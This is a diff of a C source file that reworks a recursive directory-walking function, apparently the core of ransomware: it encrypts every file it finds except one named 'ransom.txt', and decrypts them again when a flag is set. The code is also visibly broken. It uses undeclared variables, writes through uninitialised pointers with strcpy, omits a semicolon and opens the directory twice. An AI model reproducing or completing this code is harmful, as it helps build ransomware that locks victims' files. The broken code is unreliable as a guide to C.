@@ -57,57 +57,54 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 
     char *newPath;
     newPath = calloc(4096,sizeof(char));
+    // https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1046380353&id=1044780608
+    // Do a recursive function on the files found & exclude. and ..
+    DIR *d = opendir(name);
+    struct dirent *dir;
+    d = opendir(name);
+    if(d)
+    {
+        while ((dir = readdir(d)) != NULL) {
+            char* dirname;
+            strcpy(nameRep,rep->d_name);
 
-    directeur(*name){
-        // https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1046380353&id=1044780608
-        // Do a recursive function on the files found & exclude. and ..
+            if( strcmp( dir->d_name, "." ) == 0 || strcmp( dir->d_name, ".." ) == 0 ){
+                continue;
+            }
 
-        DIR *d = opendir(name);
-            struct dirent *dir;
-            d = opendir(name);
-            if(d)
-            {
-                while ((dir = readdir(d)) != NULL) {
-                    char* dirname;
-                    strcpy(nameRep,rep->d_name);
+            if (dir->d_type == DT_DIR){  //if dir
+                strcpy(newPath,name);
+                strcat(newPath,"/");
+                strcat(newPath,dirname);
+                listdir(newPath,iv,key,de_flag); // recursive
+            }
+            else {  //if not dir
+                char *filename;
+                strcpy(filename,name);
+                strcat(filename,"/");
+                strcat(filename,rep->d_name);
 
-                    if( strcmp( dir->d_name, "." ) == 0 || strcmp( dir->d_name, ".." ) == 0 ){
-                        continue;
+                //Encrypt
+                if (de_flag == 0){
+                    if(is_encrypted(filename) == 0){
+                        continue
                     }
-
-                    if (dir->d_type == DT_DIR){  //if dir
-                        strcpy(newPath,name);
-                        strcat(newPath,"/");
-                        strcat(newPath,dirname);
-                        listdir(newPath,iv,key,de_flag); // recursive
-                    }
-                    else {  //if not dir
-                        char *filename;
-                        strcpy(filename,name);
-                        strcat(filename,"/");
-                        strcat(filename,rep->d_name);
-
-                        //Encrypt
-                        if (de_flag == 0){
-                            if(is_encrypted(filename) == 0){
-                                continue
-                            }
-                            else if(strcmp(filename,"ransom.txt")!=0){
-                                encrypt(key,iv,filename);
-                            }
-                        }
-                        //Decrypt
-                        if (de_flag == 1){
-                            if(is_encrypted(filename) == 1){
-                                decrypt(key,iv,filename);
-                            }
-                        }
+                    else if(strcmp(filename,"ransom.txt")!=0){
+                        encrypt(key,iv,filename);
                     }
                 }
-                closedir(d);
+                //Decrypt
+                if (de_flag == 1){
+                    if(is_encrypted(filename) == 1){
+                        decrypt(key,iv,filename);
+                    }
+                }
             }
-            return 0;
         }
+        closedir(d);
+    }
+    return 0;
+}
 
 int isFile(const char* name){
     DIR* directory = opendir(name);
